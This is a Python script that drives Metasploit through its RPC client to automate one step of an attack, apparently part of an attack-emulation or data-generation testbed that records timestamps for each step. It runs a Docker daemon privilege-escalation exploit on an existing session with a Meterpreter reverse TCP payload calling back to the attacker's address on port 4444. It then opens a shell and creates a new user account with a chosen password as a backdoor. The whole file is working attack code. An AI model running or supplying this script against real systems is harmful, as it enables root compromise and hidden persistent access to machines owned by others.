import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    new_user_account = argv[4]
    new_user_password = argv[5]

    client = MsfRpcClient('kali')


    time.sleep(10)
    output_time_file_start = 'time_step_5_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(90)
    try:
        exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
        exploit['SESSION'] = 1
        payload['LHOST'] = my_ip
        payload['LPORT'] = 4444

        exploit.execute(payload=payload)
        shell = client.sessions
        shell.run_with_output('shell', end_strs=None)  # end_strs=None means waiting until timeout
        # shell.write('useradd -p $(openssl passwd -1 password) test') # cremetest:password
        shell.write('useradd -p $(openssl passwd -1 {0}) {1}'.format(new_user_password, new_user_account))
    
    except Exception as e:
        print(e)
        pass
    
    
    time.sleep(90)
    output_time_file_end = 'time_step_5_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(90)

    
main(sys.argv)
